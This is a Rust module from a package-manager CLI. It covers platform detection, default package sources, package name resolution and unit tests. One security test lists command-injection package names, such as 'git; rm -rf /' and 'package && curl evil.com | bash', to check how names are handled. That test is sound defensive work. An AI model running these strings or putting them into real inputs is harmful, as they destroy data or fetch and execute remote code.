use serde::{Deserialize, Serialize};

use crate::sources::PackageSource;

pub mod loaders;
pub mod schemas;

#[cfg(test)]
mod integration_tests;

pub mod constants;

// Re-export core data models from santa-data
pub use santa_data::{Arch, KnownSources, PackageData, PackageDataList, Platform, OS};
// Additional re-exports used only in tests
#[cfg(test)]
pub use santa_data::Distro;

/// Extension trait for Platform with santa-cli specific functionality
pub trait PlatformExt {
    fn current() -> Platform;
    fn get_default_sources() -> Vec<KnownSources>;
    fn detect_linux_package_managers() -> Vec<KnownSources>;
}

impl PlatformExt for Platform {
    /// Get current platform using compile-time detection where possible
    fn current() -> Self {
        let mut platform = Platform::default();

        // Compile-time OS detection
        if cfg!(target_os = "windows") {
            platform.os = OS::Windows;
        } else if cfg!(target_os = "macos") {
            platform.os = OS::Macos;
        } else if cfg!(target_os = "linux") {
            platform.os = OS::Linux;
        } else {
            // Fallback to runtime detection for unknown platforms
            match std::env::consts::OS {
                "windows" => platform.os = OS::Windows,
                "macos" | "ios" => platform.os = OS::Macos,
                _ => platform.os = OS::Linux,
            }
        }

        // Compile-time architecture detection
        if cfg!(target_arch = "x86_64") {
            platform.arch = Arch::X64;
        } else if cfg!(target_arch = "x86") {
            platform.arch = Arch::X86;
        } else if cfg!(target_arch = "aarch64") {
            platform.arch = Arch::Aarch64;
        } else if cfg!(target_arch = "arm") {
            platform.arch = Arch::Arm;
        } else {
            // Fallback to runtime detection
            match std::env::consts::ARCH {
                "x86_64" => platform.arch = Arch::X64,
                "x86" => platform.arch = Arch::X86,
                "aarch64" => platform.arch = Arch::Aarch64,
                "arm" => platform.arch = Arch::Arm,
                _ => panic!("Unsupported architecture: {}", std::env::consts::ARCH),
            }
        }

        platform
    }

    /// Get default package sources for the current platform
    fn get_default_sources() -> Vec<KnownSources> {
        if cfg!(target_os = "macos") {
            vec![KnownSources::Brew, KnownSources::Cargo]
        } else if cfg!(target_os = "linux") {
            // Use runtime detection for accuracy in containerized environments
            Self::detect_linux_package_managers()
        } else if cfg!(target_os = "windows") {
            vec![KnownSources::Scoop, KnownSources::Cargo]
        } else {
            vec![KnownSources::Cargo] // Fallback to universal package manager
        }
    }

    /// Detect Linux package managers with runtime checks
    fn detect_linux_package_managers() -> Vec<KnownSources> {
        let mut sources = Vec::new();

        // Check for actual package manager presence
        if which::which("apt").is_ok() {
            sources.push(KnownSources::Apt);
        }
        if which::which("pacman").is_ok() {
            sources.push(KnownSources::Pacman);
        }
        if which::which("yay").is_ok() {
            sources.push(KnownSources::Aur);
        }

        // Always add cargo as it's commonly available
        sources.push(KnownSources::Cargo);

        // Fallback to apt if no package manager detected
        if sources.is_empty() {
            sources.push(KnownSources::Apt);
        }

        sources
    }
}

pub type SourceList = Vec<PackageSource>;

#[derive(Serialize, Deserialize, Clone, Debug)]
pub struct SantaData {
    pub packages: PackageDataList,
    pub sources: SourceList,
}

impl SantaData {
    pub fn load_from_str(packages_str: &str, sources_str: &str) -> Self {
        // Use the new schema loaders and convert to legacy format
        use crate::data::loaders::{convert_to_legacy_packages, convert_to_legacy_sources};

        // Parse using our custom santa-data parser that handles both simple and complex formats
        let schema_packages =
            santa_data::parse_ccl_to(packages_str).expect("Failed to load packages CCL");

        let schema_sources = sickle::from_str(sources_str).expect("Failed to load sources CCL");

        // Convert to legacy format
        let packages = convert_to_legacy_packages(schema_packages);
        let sources = convert_to_legacy_sources(schema_sources);

        SantaData { packages, sources }
    }

    pub fn name_for(&self, package: &str, source: &PackageSource) -> String {
        match self.packages.get(package) {
            #[allow(clippy::collapsible_match)]
            Some(sources) => match sources.get(source.name()) {
                Some(pkgs) => match pkgs {
                    Some(name) => name
                        .name
                        .as_ref()
                        .map(|s| s.to_string())
                        .unwrap_or_else(|| source.adjust_package_name(package)),
                    None => source.adjust_package_name(package),
                },
                None => source.adjust_package_name(package),
            },
            None => source.adjust_package_name(package),
        }
    }
}

impl Default for SantaData {
    fn default() -> Self {
        SantaData::load_from_str(constants::BUILTIN_PACKAGES, constants::BUILTIN_SOURCES)
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::collections::HashMap;

    #[test]
    fn test_known_sources_serialization() {
        // Test that KnownSources enum serializes correctly
        let sources = vec![
            KnownSources::Apt,
            KnownSources::Brew,
            KnownSources::Cargo,
            KnownSources::Unknown("custom".to_string()),
        ];

        for source in &sources {
            let serialized = source.to_string();
            let deserialized: KnownSources = serialized.parse().unwrap();
            assert_eq!(source, &deserialized);
        }
    }

    #[test]
    fn test_platform_current_detection() {
        let platform = Platform::current();

        // Basic sanity checks - these should always pass
        assert!(matches!(platform.os, OS::Linux | OS::Macos | OS::Windows));
        assert!(matches!(platform.arch, Arch::X64 | Arch::Aarch64));

        // Test platform display
        let display_str = format!("{platform}");
        assert!(!display_str.is_empty());

        // Test that current platform detection is consistent
        let platform2 = Platform::current();
        assert_eq!(platform.os, platform2.os);
        assert_eq!(platform.arch, platform2.arch);
    }

    #[test]
    fn test_platform_display() {
        let platform_with_distro = Platform {
            os: OS::Linux,
            arch: Arch::X64,
            distro: Some(Distro::Ubuntu),
        };

        let platform_without_distro = Platform {
            os: OS::Macos,
            arch: Arch::Aarch64,
            distro: None,
        };

        let display_with = format!("{platform_with_distro}");
        let display_without = format!("{platform_without_distro}");

        assert!(display_with.contains("Linux"));
        assert!(display_with.contains("X64"));
        assert!(display_with.contains("Ubuntu"));

        assert!(display_without.contains("Macos"));
        assert!(display_without.contains("Aarch64"));
        assert!(!display_without.contains("Ubuntu"));
    }

    #[test]
    fn test_package_data_creation() {
        let pkg_data = PackageData::new("git");
        assert_eq!(pkg_data.name, Some("git".to_string()));
        assert!(pkg_data.before.is_none());
        assert!(pkg_data.after.is_none());
        assert!(pkg_data.pre.is_none());
        assert!(pkg_data.post.is_none());
    }

    #[test]
    fn test_santa_data_name_for() {
        // Create test data
        let mut packages = PackageDataList::new();
        let mut git_sources = HashMap::new();
        git_sources.insert(KnownSources::Brew, Some(PackageData::new("git")));
        git_sources.insert(KnownSources::Apt, None);
        packages.insert("git".to_string(), git_sources);

        let sources = SourceList::new();
        let data = SantaData { packages, sources };

        // Create test source
        let brew_source = crate::sources::PackageSource::new_for_test(
            KnownSources::Brew,
            "🍺",
            "brew",
            "brew install",
            "brew list",
            Some("prefix.".to_string()),
            None,
        );

        // Test name resolution
        let name = data.name_for("git", &brew_source);
        assert_eq!(name, "git"); // Should use the stored name, not the adjusted one

        // Test with non-existent package
        let name_missing = data.name_for("nonexistent", &brew_source);
        assert_eq!(name_missing, "prefix.nonexistent"); // Should use source's adjust_package_name
    }

    #[test]
    fn test_package_data_list_keys() {
        let mut packages = PackageDataList::new();
        let mut git_sources = HashMap::new();
        git_sources.insert(KnownSources::Brew, Some(PackageData::new("git")));
        packages.insert("git".to_string(), git_sources);

        // Test that package keys are correct
        let keys: Vec<_> = packages.keys().collect();
        assert!(keys.contains(&&"git".to_string()));
    }

    #[test]
    fn test_santa_data_default() {
        let data = SantaData::default();

        // Default data should have some packages and sources
        assert!(!data.packages.is_empty());
        assert!(!data.sources.is_empty());
    }

    #[test]
    fn test_security_package_names() {
        // Test that various dangerous package names are handled
        let dangerous_names = vec![
            "git; rm -rf /",
            "$(evil_command)",
            "`dangerous`",
            "../../../etc/passwd",
            "package && curl evil.com | bash",
        ];

        let mut packages = PackageDataList::new();
        for name in &dangerous_names {
            let mut sources = HashMap::new();
            sources.insert(KnownSources::Brew, Some(PackageData::new(name)));
            packages.insert(name.to_string(), sources);
        }

        let data = SantaData {
            packages,
            sources: SourceList::new(),
        };

        // Test that package names are preserved (they should be sanitized during execution)
        for name in &dangerous_names {
            assert!(data.packages.contains_key(*name));
        }

        // Test name_for with dangerous source
        let source = crate::sources::PackageSource::new_for_test(
            KnownSources::Brew,
            "🍺",
            "brew; rm -rf /",
            "brew install",
            "brew list",
            None,
            None,
        );

        for name in &dangerous_names {
            let resolved = data.name_for(name, &source);
            // Should return the name as-is - sanitization should happen at execution time
            assert!(!resolved.is_empty());
        }
    }

    #[test]
    fn test_platform_get_default_sources() {
        let defaults = Platform::get_default_sources();

        // Should always return at least one source
        assert!(!defaults.is_empty());

        // Should include Cargo on all platforms as a universal package manager
        assert!(defaults.contains(&KnownSources::Cargo));

        // Test platform-specific defaults (compile-time detection)
        if cfg!(target_os = "macos") {
            assert!(defaults.contains(&KnownSources::Brew));
        } else if cfg!(target_os = "windows") {
            assert!(defaults.contains(&KnownSources::Scoop));
        } else if cfg!(target_os = "linux") {
            // Linux should have at least one Linux package manager
            let has_linux_pm = defaults.iter().any(|s| {
                matches!(
                    s,
                    KnownSources::Apt | KnownSources::Pacman | KnownSources::Aur
                )
            });
            assert!(has_linux_pm);
        }

        // All sources should be known (not Unknown variants)
        for source in &defaults {
            assert!(!matches!(source, KnownSources::Unknown(_)));
        }
    }

    #[test]
    fn test_platform_detect_linux_package_managers() {
        // Note: This function is private, but we can test it through get_default_sources
        // when running on Linux
        if cfg!(target_os = "linux") {
            let defaults = Platform::get_default_sources();

            // Should contain at least Cargo
            assert!(defaults.contains(&KnownSources::Cargo));

            // Should have at least one Linux-specific package manager
            let linux_managers = defaults
                .iter()
                .filter(|&s| {
                    matches!(
                        s,
                        KnownSources::Apt | KnownSources::Pacman | KnownSources::Aur
                    )
                })
                .count();

            // Even if no Linux package managers are detected, should fall back to apt
            assert!(linux_managers >= 1 || defaults.contains(&KnownSources::Apt));
        }
    }

    #[test]
    fn test_santa_data_default_has_content() {
        // Test that default data has packages and sources
        let original_data = SantaData::default();

        // Verify packages are loaded
        assert!(!original_data.packages.is_empty());

        // Verify sources are loaded
        assert!(!original_data.sources.is_empty());
    }

    #[test]
    fn test_os_arch_distro_enums() {
        // Test enum variants exist and can be compared
        let os_variants = vec![OS::Linux, OS::Macos, OS::Windows];
        let arch_variants = vec![Arch::X64, Arch::Aarch64];
        let distro_variants = vec![Distro::None, Distro::ArchLinux, Distro::Ubuntu];

        // Test that cloning and equality work
        for os in &os_variants {
            assert_eq!(os, &os.clone());
        }

        for arch in &arch_variants {
            assert_eq!(arch, &arch.clone());
        }

        for distro in &distro_variants {
            assert_eq!(distro, &distro.clone());
        }

        // Test Debug trait
        assert!(!format!("{:?}", OS::Linux).is_empty());
        assert!(!format!("{:?}", Arch::X64).is_empty());
        assert!(!format!("{:?}", Distro::Ubuntu).is_empty());
    }

    #[test]
    fn test_platform_with_all_combinations() {
        // Test various platform combinations
        let platforms = vec![
            Platform {
                os: OS::Linux,
                arch: Arch::X64,
                distro: Some(Distro::Ubuntu),
            },
            Platform {
                os: OS::Linux,
                arch: Arch::Aarch64,
                distro: Some(Distro::ArchLinux),
            },
            Platform {
                os: OS::Macos,
                arch: Arch::X64,
                distro: None,
            },
            Platform {
                os: OS::Macos,
                arch: Arch::Aarch64,
                distro: None,
            },
            Platform {
                os: OS::Windows,
                arch: Arch::X64,
                distro: None,
            },
        ];

        for platform in platforms {
            // Test clone and equality
            assert_eq!(platform, platform.clone());

            // Test display
            let display = format!("{platform}");
            assert!(!display.is_empty());

            // Display should contain OS and arch
            assert!(display.contains(&format!("{:?}", platform.os)));
            assert!(display.contains(&format!("{:?}", platform.arch)));

            // If distro is present, should be in display
            if let Some(ref distro) = platform.distro {
                assert!(display.contains(&format!("{distro:?}")));
            }
        }
    }

    #[test]
    fn test_santa_data_name_for_edge_cases() {
        let mut packages = PackageDataList::new();

        // Package with partial source data
        let mut git_sources = HashMap::new();
        git_sources.insert(
            KnownSources::Brew,
            Some(PackageData {
                name: None, // No name override
                before: Some("echo before".to_string()),
                after: None,
                pre: None,
                post: None,
            }),
        );
        git_sources.insert(KnownSources::Apt, None); // Source exists but no data
        packages.insert("git".to_string(), git_sources);

        // Package with name override
        let mut vim_sources = HashMap::new();
        vim_sources.insert(
            KnownSources::Brew,
            Some(PackageData {
                name: Some("vim-override".to_string()),
                before: None,
                after: None,
                pre: None,
                post: None,
            }),
        );
        packages.insert("vim".to_string(), vim_sources);

        let data = SantaData {
            packages,
            sources: SourceList::new(),
        };

        let brew_source = crate::sources::PackageSource::new_for_test(
            KnownSources::Brew,
            "🍺",
            "brew",
            "brew install",
            "brew list",
            Some("prefix-".to_string()),
            None,
        );

        let apt_source = crate::sources::PackageSource::new_for_test(
            KnownSources::Apt,
            "📦",
            "apt",
            "apt install",
            "apt list",
            None,
            None,
        );

        // Test git with brew (has PackageData but no name override)
        let git_brew_name = data.name_for("git", &brew_source);
        assert_eq!(
            git_brew_name, "prefix-git",
            "Should use source adjustment when no name override"
        );

        // Test git with apt (source exists but PackageData is None)
        let git_apt_name = data.name_for("git", &apt_source);
        assert_eq!(
            git_apt_name, "git",
            "Should use source adjustment when PackageData is None"
        );

        // Test vim with brew (has name override)
        let vim_brew_name = data.name_for("vim", &brew_source);
        assert_eq!(
            vim_brew_name, "vim-override",
            "Should use name override when provided"
        );

        // Test unknown package
        let unknown_name = data.name_for("unknown-package", &brew_source);
        assert_eq!(
            unknown_name, "prefix-unknown-package",
            "Should use source adjustment for unknown packages"
        );

        // Test with source not in package data
        let cargo_source = crate::sources::PackageSource::new_for_test(
            KnownSources::Cargo,
            "📦",
            "cargo",
            "cargo install",
            "cargo search",
            None,
            None,
        );

        let git_cargo_name = data.name_for("git", &cargo_source);
        assert_eq!(
            git_cargo_name, "git",
            "Should use source adjustment when source not in package data"
        );
    }

    #[test]
    fn test_package_data_list_with_complex_names() {
        let mut packages = PackageDataList::new();

        // Add packages with various Unicode characters and special names
        let test_packages = vec![
            "git",
            "🦀-rust-package",
            "package-with-dashes",
            "package_with_underscores",
            "123numeric-start",
            "CamelCasePackage",
        ];

        for pkg in &test_packages {
            let mut sources = HashMap::new();
            sources.insert(KnownSources::Brew, Some(PackageData::new(pkg)));
            packages.insert(pkg.to_string(), sources);
        }

        // All packages should be present as keys
        for pkg in &test_packages {
            assert!(
                packages.contains_key(*pkg),
                "PackageDataList should contain package: {pkg}"
            );
        }

        assert_eq!(packages.len(), test_packages.len());
    }

    #[test]
    fn test_known_sources_unknown_variant_handling() {
        // Test that Unknown variant works correctly
        let unknown_source = KnownSources::Unknown("custom-manager".to_string());

        // Test Display/ToString
        let serialized = unknown_source.to_string();
        assert!(serialized.contains("custom-manager"));

        // Test FromStr (parse)
        let parsed: KnownSources = "totally-unknown-package-manager".parse().unwrap();
        assert!(matches!(parsed, KnownSources::Unknown(_)));

        if let KnownSources::Unknown(name) = parsed {
            assert_eq!(name, "totally-unknown-package-manager");
        }
    }
}
